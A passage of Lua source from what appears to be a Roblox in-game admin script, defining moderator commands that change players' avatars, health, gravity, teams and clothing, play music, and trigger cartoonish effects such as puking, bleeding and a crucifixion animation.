for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Shows you what rank the target player(s) are in the group specified by groupID',2,set.Prefix,{'rank','getrank'},{'player','groupID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:IsInGroup(args[2]) then 
set.Hint("[" .. v:GetRankInGroup(args[2]) .. "] " .. v:GetRoleInGroup(args[2]), {plr})
elseif v and not v:IsInGroup(args[2])then
set.Hint(v.Name .. " is not in the group " .. args[2], {plr})
end
end)()
end
end)

set.MakeCommand('Removes <number> HP from the target player(s)',2,set.Prefix,{'damage','hurt'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid:TakeDamage(args[2])
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s gravity normal',2,set.Prefix,{'grav','bringtoearth'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s gravity',2,set.Prefix,{'setgrav','gravity','setgravity'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*tonumber(args[2]),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*tonumber(args[2]),0) end end
end
end)()
end
end)

set.MakeCommand('NoGrav the target player(s)',2,set.Prefix,{'nograv','nogravity','superjump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s health to <number>',2,set.Prefix,{'health','sethealth'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = args[2]
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s WalkSpeed to <number>',2,set.Prefix,{'speed','setspeed','walkspeed'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.WalkSpeed = args[2]
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s team to <team>',2,set.Prefix,{'team','setteam','changeteam'},{'player','team'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and game:findFirstChild("Teams") then 
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(args[2]:lower()) == 1 then v.TeamColor = tm.TeamColor end
end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s field of view to <number> (min 1, max 120)',-1,set.Prefix,{'fov','fieldofview'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','FieldOfView',args[2])
	end
end)

set.MakeCommand('Teleport the target player(s) to the place belonging to <placeID>',2,set.Prefix,{'place'},{'player','placeID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
set.PromptPlaceTeleport(v,"Teleport to "..args[2].."?",args[2])
end)()
end
end)

set.MakeCommand('Teleport player1(s) to player2, a waypoint, or specific coords, use :tp player1 waypoint-WAYPOINTNAME to use waypoints, x,y,z for coords',2,set.Prefix,{'tp','teleport'},{'player1','player2'},2,function(plr,args)
if args[2]:match('^waypoint%-(.*)') then
	local m=args[2]:match('^waypoint%-(.*)')
	local point
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#m)==m:lower() then
			point=v
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if point then
			v.Character:MoveTo(point)
		end
	end
	if not point then set.Hint('Waypoint '..m..' was not found.',{plr}) end
elseif args[2]:find(',') then
	local x,y,z=args[2]:match('(.*),(.*),(.*)')
	for i,v in pairs(set.GetPlayers(plr,args[1])) do 
		v.Character:MoveTo(Vector3.new(tonumber(x),tonumber(y),tonumber(z))) 
	end
else
	local plrz = set.GetPlayers(plr, args[1]:lower())
	local plrz2 = set.GetPlayers(plr, args[2]:lower())
	for i, v in pairs(plrz) do
	coroutine.wrap(function()
	for i2, v2 in pairs(plrz2) do
	if v and v2 and v.Character and v2.Character and v.Character:FindFirstChild('Humanoid') and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
	if v.Character.Humanoid.Sit==true then
	v.Character.Humanoid.Sit=false
	wait(0.5)
	end
	v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
	end
	end
	end)()
	end
end
end)

set.MakeCommand('Teleport the target player(s) up by <height> studs',-1,set.Prefix,{'freefall','skydive'},{'player','height'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character:FindFirstChild('Torso') then 
v.Character.Torso.CFrame=v.Character.Torso.CFrame+Vector3.new(0,tonumber(args[2]),0)
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s leader stat <stat> value to <value>',2,set.Prefix,{'change','leaderstat','stat'},{'player','stat','value'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then 
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(args[2]:lower()) == 1 then st.Value = args[3] end
end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the shirt that belongs to <id>',2,set.Prefix,{'shirt','giveshirt'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Shirt") then k:Destroy() end
end
local s=Instance.new('Shirt',v.Character)
s.ShirtTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the pants that belongs to <id>',2,set.Prefix,{'pants','givepants'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Pants") then k:Destroy() end
end
local s=Instance.new('Pants',v.Character)
s.PantsTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the face that belongs to <id>',2,set.Prefix,{'face','giveface'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if not v.Character:FindFirstChild("Head") then return end
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then 
v.Character.Head:findFirstChild("face"):Destroy()--.Texture = "http://www.roblox.com/asset/?id=" .. args[2]
end
game:service('InsertService'):LoadAsset(tonumber(args[2])):children()[1].Parent=v.Character:FindFirstChild("Head")
end)()
end
end)

set.MakeCommand('Swag the target player(s) up',-1,set.Prefix,{'swagify','swagger'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
set.Cape(v,'Fabric','Pink',109301474)
end
end)()
end
end)

set.MakeCommand('Send the target player(s) to the moon!',-1,set.Prefix,{'rocket','firework'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then
delay(0,function()
local speed = 10
local Part = Instance.new("Part")
Part.Parent = v.Character
local SpecialMesh = Instance.new("SpecialMesh") 
SpecialMesh.Parent = Part
SpecialMesh.MeshId = "http://www.roblox.com/asset/?id=2251534" 
SpecialMesh.MeshType = "FileMesh" 
SpecialMesh.TextureId = "43abb6d081e0fbc8666fc92f6ff378c1" 
SpecialMesh.Scale = Vector3.new(0.5,0.5,0.5)
local Weld = Instance.new("Weld")
Weld.Parent = Part
Weld.Part0 = Part
Weld.Part1 = v.Character.Torso
Weld.C0 = CFrame.new(0,-1,0)*CFrame.Angles(-1.5,0,0)
local BodyVelocity = Instance.new("BodyVelocity")
BodyVelocity.Parent = Part
BodyVelocity.maxForce = Vector3.new(math.huge,math.huge,math.huge)
BodyVelocity.velocity = Vector3.new(0,10*speed,0)
delay(0,function()
for i = 1,math.huge do
local Explosion = Instance.new("Explosion")
Explosion.Parent = Part
Explosion.BlastRadius = 0
Explosion.Position = Part.Position + Vector3.new(0,0,0)
wait()
end 
end)        
wait(3)
pcall(function()
BodyVelocity:remove()
Instance.new("Explosion",workspace).Position=v.Character.Torso.Position
v.Character:BreakJoints()
end)
end)
end
end)()
end
end)

set.MakeCommand('Make the target player(s) dance',-1,set.Prefix,{'dance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','dance')
end
end)

set.MakeCommand('Make the target player(s) break dance',-1,set.Prefix,{'breakdance','fundance','lolwut'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
local color
local num=math.random(1,7)
if num==1 then
color='Really blue'
elseif num==2 then
color='Really red'
elseif num==3 then
color='Magenta'
elseif num==4 then
color='Lime green'
elseif num==5 then
color='Hot pink'
elseif num==6 then
color='New Yeller'
elseif num==7 then
color='White'
end
local hum=v.Character:FindFirstChild('Humanoid')
if not hum then return end
set.Remote(v,'Function','Effect','dance')
set.ProcessCommand(plr,set.Prefix.."batch"..set.SplitKey..set.Prefix.."sparkles"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."fire"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."nograv"..set.SplitKey..v.Name..set.BatchSplit..set.Prefix.."smoke"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."spin"..set.SplitKey..v.Name)
repeat hum.PlatformStand=true wait() until not hum or hum==nil or hum.Parent==nil
end)()
end
end)

set.MakeCommand('Make the target player(s) puke',-1,set.Prefix,{'puke','barf','throwup','vomit'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Puke') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Puke'
coroutine.wrap(function()
repeat 
wait(0.15)
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolor
if color == 1 then
bcolor = BrickColor.new(192)
elseif color == 2 then
bcolor = BrickColor.new(28)
elseif color == 3 then
bcolor = BrickColor.new(105)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Head.CFrame * CFrame.new(Vector3.new(0, 0, -1))
p.Velocity = v.Character.Head.CFrame.lookVector * 20 + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
p.Anchored = false
m.Name='Puke Peice'
p.Name='Puke Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Puke Peice' and o.Name~='Blood Peice' and o.Name~='Blood Plate' and o.Name~='Puke Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Puke Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(119)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='PukeMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Puke Plate' and p then 
	p:Destroy() 
	o.PukeMesh.Scale=o.PukeMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Make the target player(s) bleed',-1,set.Prefix,{'cut','stab','shank'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Bleed') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Bleed'
coroutine.wrap(function()
repeat 
wait(0.15)
v.Character.Humanoid.Health=v.Character.Humanoid.Health-1
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolo
if color == 1 then
bcolor = BrickColor.new(21)
elseif color == 2 then
bcolor = BrickColor.new(1004)
elseif color == 3 then
bcolor = BrickColor.new(21)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Torso.CFrame * CFrame.new(Vector3.new(2, 0, 0))
p.Velocity = v.Character.Head.CFrame.lookVector * 1 + Vector3.new(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
p.Anchored = false
m.Name='Blood Peice'
p.Name='Blood Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Blood Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(21)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='BloodMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Blood Plate' and p then 
	p:Destroy() 
	o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Shows you the number of player points left in the game',5,set.Prefix,{'points','getpoints'},{},0,function(plr,args)
	set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
end)

set.MakeCommand('Lets you give <player> <amount> player points',5,set.Prefix,{'givepoints','sendpoints'},{'player','amount'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local ran,failed=ypcall(function() game:GetService("PointsService"):AwardPoints(v.userId,tonumber(args[2])) end)
		if ran and game:GetService("PointsService"):GetAwardablePoints()>=tonumber(args[2]) then
			set.Hint('Gave '..args[2]..' points to '..v.Name,{plr})
		elseif game:GetService("PointsService"):GetAwardablePoints()<tonumber(args[2])then
			set.Hint("You don't have "..args[2]..' points to give to '..v.Name,{plr})
		else
			set.Hint("(Unknown Error) Failed to give "..args[2]..' points to '..v.Name,{plr})
		end
		set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
	end
end)

set.MakeCommand('Slowly kills the target player(s)',-1,set.Prefix,{'poison'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character:FindFirstChild('Torso')
		local larm=v.Character:FindFirstChild('Left Arm')
		local rarm=v.Character:FindFirstChild('Right Arm')
		local lleg=v.Character:FindFirstChild('Left Leg')
		local rleg=v.Character:FindFirstChild('Right Leg')
		local head=v.Character:FindFirstChild('Head')
		local hum=v.Character:FindFirstChild('Humanoid')
		if torso and larm and rarm and lleg and rleg and head and hum and not v.Character:FindFirstChild('KohlsPoisoned') then
			local poisoned=Instance.new('BoolValue',v.Character)
			poisoned.Name='KohlsPoisoned'
			poisoned.Value=true
			local tor=torso.BrickColor
			local lar=larm.BrickColor
			local rar=rarm.BrickColor
			local lle=lleg.BrickColor
			local rle=rleg.BrickColor
			local hea=head.BrickColor
			torso.BrickColor=BrickColor.new('Br. yellowish green')
			larm.BrickColor=BrickColor.new('Br. yellowish green')
			rarm.BrickColor=BrickColor.new('Br. yellowish green')
			lleg.BrickColor=BrickColor.new('Br. yellowish green')
			rleg.BrickColor=BrickColor.new('Br. yellowish green')
			head.BrickColor=BrickColor.new('Br. yellowish green')
			local run=true
			coroutine.wrap(function() wait(10) run=false end)()
			repeat
				wait(1)
				hum.Health=hum.Health-5
			until (not poisoned) or (not poisoned.Parent) or (not run)
			if poisoned and poisoned.Parent then
				torso.BrickColor=tor
				larm.BrickColor=lar
				rarm.BrickColor=rar
				lleg.BrickColor=lle
				rleg.BrickColor=rle
				head.BrickColor=hea
			end
		end
	end
end)

set.MakeCommand('Makes the target player(s) say interesting things, makes it hard for them to walk, and eventually kills them',-1,set.Prefix,{'drug','intoxicate'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		set.Remote(v,'Function','Drug')
	end
end)

set.MakeCommand('Change the pitch o the currently playing song',2,set.Prefix,{'pitch'},{'number'},1,function(plr,args)
coroutine.wrap(function()
local pitch = args[1]
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v.Pitch=pitch end end
end)()
end)

set.MakeCommand('Start playing a song',2,set.Prefix,{'music','song','playsong'},{'id'},1,function(plr,args)
coroutine.wrap(function()
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = args[1]:lower()
local pitch = 1
local mp = game:service('MarketplaceService')
local volume = 1
for i,v in pairs(set['MusicList']) do if id==v.Name:lower() then id=v.Id if v.Pitch then pitch=v.Pitch end if v.Volume then volume=v.Volume end end end
local name = 'Invalid ID '
pcall(function() if mp:GetProductInfo(id).AssetTypeId==3 then name = 'Now playing '..mp:GetProductInfo(id).Name end end)
local s = Instance.new("Sound") 
s.Name='Sound'..set.RemoteObject
s.Parent=workspace
s.SoundId = "http://www.roblox.com/asset/?id=" .. id 
s.Volume = volume 
s.Pitch = pitch 
s.Looped = true 
s.archivable = false
pcall(function() s:Play()end)
set.Hint(name..' ('..id..')',game:service('Players'):children())
end)()
end)

set.MakeCommand('Stop the currently playing song',2,set.Prefix,{'stopmusic','musicoff'},{},0,function(plr,args)
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end)

set.MakeCommand('Shows you the script\'s available music list',2,set.Prefix,{'musiclist','listmusic','songs'},{},0,function(plr,args)
local listforclient={}
for i, v in pairs(set['MusicList']) do 
table.insert(listforclient,v.Name)
end
--set.Remote(plr,'SetSetting','MusicList',listforclient)
set.Remote(plr,'Function','ListGui','Music List',listforclient)
end)

set.MakeCommand('Turns the target player(s) into a stick figure',-1,set.Prefix,{'stickify','stick','stickman'},{'player'},1,function(plr,args)
	local plrz = set.GetPlayers(plr, args[1]:lower())
	for kay, player in pairs(plrz) do
	coroutine.wrap(function()
	local m = player.Character
	for i,v in pairs(m:GetChildren()) do
	if v:IsA ("Part") then
	local s = Instance.new("SelectionPartLasso")
	s.Parent = m.Torso
	s.Part = v
	s.Humanoid = m.Humanoid
	s.Color = BrickColor.new(0,0,0)
	v.Transparency = 1
	m.Head.Transparency = 0
	m.Head.Mesh:Remove()
	local b = Instance.new("SpecialMesh")
	b.Parent = m.Head
	b.MeshType = "Sphere"
	b.Scale = Vector3.new(.5,1,1)
	m.Head.BrickColor = BrickColor.new("Black")
	end 
	end
	end)()
	end 
end)

set.MakeCommand('Sends the target player(s) down a hole',-1,set.Prefix,{'hole','sparta'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for kay, player in pairs(plrz) do
coroutine.wrap(function()
local torso=player.Character:FindFirstChild('Torso')
if torso then
local hole = Instance.new("Part",player.Character)
hole.Anchored = true
hole.CanCollide = false
hole.formFactor = Enum.FormFactor.Custom
hole.Size = Vector3.new(10,1,10)
hole.CFrame = torso.CFrame * CFrame.new(0,-3.3,-3)
hole.BrickColor = BrickColor.new("Really black")
local holeM = Instance.new("CylinderMesh",hole)
torso.Anchored = true
local foot = torso.CFrame * CFrame.new(0,-3,0)
for i=1,10 do
torso.CFrame = foot * CFrame.fromEulerAnglesXYZ(-(math.pi/2)*i/10,0,0) * CFrame.new(0,3,0)
wait()
end
for i=1,5,0.2 do
torso.CFrame = foot * CFrame.new(0,-(i^2),0) * CFrame.fromEulerAnglesXYZ(-(math.pi/2),0,0) * CFrame.new(0,3,0)
wait()
end
player.Character.Humanoid.Health=0
end
end)()
end
end)

set.MakeCommand('Crucifies the target players(s) (Old Roman punishment done to thousands of people, saying its offensive only means you are ignorant)',-1,set.Prefix,{'crucify','cross'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character['Torso']
		local larm=v.Character['Left Arm']
		local rarm=v.Character['Right Arm']
		local lleg=v.Character['Left Leg']
		local rleg=v.Character['Right Leg']
		local head=v.Character['Head']
		if torso and larm and rarm and lleg and rleg and head and not v.Character:FindFirstChild(v.Name..'kohlscrusify') then
			local cru=Instance.new('Model',v.Character)
			cru.Name=v.Name..'kohlscrusify'
			local c1=Instance.new('Part',cru)
			c1.BrickColor=BrickColor.new('Reddish brown')
			c1.Material='Wood'
			c1.CFrame=(v.Character.Torso.CFrame-v.Character.Torso.CFrame.lookVector)*CFrame.new(0,0,2)
			c1.Size=Vector3.new(2,18.4,1)
			c1.Anchored=true
			local c2=c1:Clone()
			c2.Parent=cru
			c2.Size=Vector3.new(11,1.6,1)
			c2.CFrame=c1.CFrame+Vector3.new(0,5,0)
			torso.Anchored=true
			wait(0.5)
			torso.CFrame=c2.CFrame+torso.CFrame.lookVector+Vector3.new(0,-1,0)
			wait(0.5)
			larm.Anchored=true
			rarm.Anchored=true
			lleg.Anchored=true
			rleg.Anchored=true
			head.Anchored=true
			wait()
			larm.CFrame=torso.CFrame*CFrame.new(-1.5,1,0)
			rarm.CFrame=torso.CFrame*CFrame.new(1.5,1,0)
			lleg.CFrame=torso.CFrame*CFrame.new(-0.1,-1.7,0)
			rleg.CFrame=torso.CFrame*CFrame.new(0.1,-1.7,0)
			larm.CFrame=larm.CFrame*CFrame.Angles(0,0,-140)
			rarm.CFrame=rarm.CFrame*CFrame.Angles(0,0,140)
			lleg.CFrame=lleg.CFrame*CFrame.Angles(0,0,0.6)
			rleg.CFrame=rleg.CFrame*CFrame.Angles(0,0,-0.6)
			--head.CFrame=head.CFrame*CFrame.Angles(0,0,0.3)
			local n1=Instance.new('Part',cru)
			n1.BrickColor=BrickColor.new('Dark stone grey')
			n1.Material='DiamondPlate'
			n1.Size=Vector3.new(0.2,0.2,2)
			n1.Anchored=true
			local m=Instance.new('BlockMesh',n1)
			m.Scale=Vector3.new(0.2,0.2,0.7)
			n2=n1:clone()
			n2.Parent=cru
			n3=n1:clone()
			n3.Parent=cru
			n1.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(2,0,0)
			n2.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(-2,0,0)
			n3.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(0,-3,0)
			coroutine.wrap(function()
				repeat 
					wait(0.1)
					v.Character.Humanoid.Health=v.Character.Humanoid.Health-0.6
					local p = Instance.new("Part",v.Character)
					p.CanCollide = false
					local color = math.random(1, 3)
					local bcolo
					if color == 1 then
						bcolor = BrickColor.new(21)
						parent=n1
					elseif color == 2 then
						bcolor = BrickColor.new(1004)
						parent=n2
					elseif color == 3 then
						bcolor = BrickColor.new(21)
						parent=n3
					end
					p.BrickColor = bcolor
					local m=Instance.new('BlockMesh',p)
					p.Size=Vector3.new(0.1,0.1,0.1)
					m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
					p.Locked = true
					p.TopSurface = "Smooth"
					p.BottomSurface = "Smooth"
					p.CFrame = parent.CFrame
					p.Anchored = false
					m.Name='Blood Peice'
					p.Name='Blood Peice'
					p.Touched:connect(function(o)
						if o and p and o~=parent and o~=n1 and o~=n2 and o~=n3 and o~=c1 and o~=c2 and o.Parent~=cru and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
							local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
							p:Destroy()
							local g=Instance.new('Part',workspace)
							g.Anchored=true
							g.CanCollide=false
							g.Size=Vector3.new(0.1,0.1,0.1)
							g.Name='Blood Plate'
							g.CFrame=cf
							g.BrickColor=BrickColor.new(21)
							local c=Instance.new('CylinderMesh',g)
							c.Scale=Vector3.new(1,0.2,1)
							c.Name='BloodMesh'
							wait(10)
							g:Destroy()
						elseif o and o.Name=='Blood Plate' and p then 
							p:Destroy() 
							o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(1,0,1)
						end
					end)
				until (not cru) or (not cru.Parent) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character.Humanoid.Health<=0
			end)()
		end
	end
end)

set.MakeCommand('Lets the target player(s) fly',2,set.Prefix,{'fly','flight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','fly')
end
end)

set.MakeCommand('Removes the target player(s)\'s ability to fly',2,set.Prefix,{'unfly','ground'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','unfly')
end
end)

set.MakeCommand('Turns the place into a disco party',-1,set.Prefix,{'disco'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask = true
repeat
if set.lighttask==false then return end
local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game:service('Lighting').Ambient = color
game:service('Lighting').OutdoorAmbient = color
game:service('Lighting').FogColor = color
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the place flash',-1,set.Prefix,{'flash'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask=true
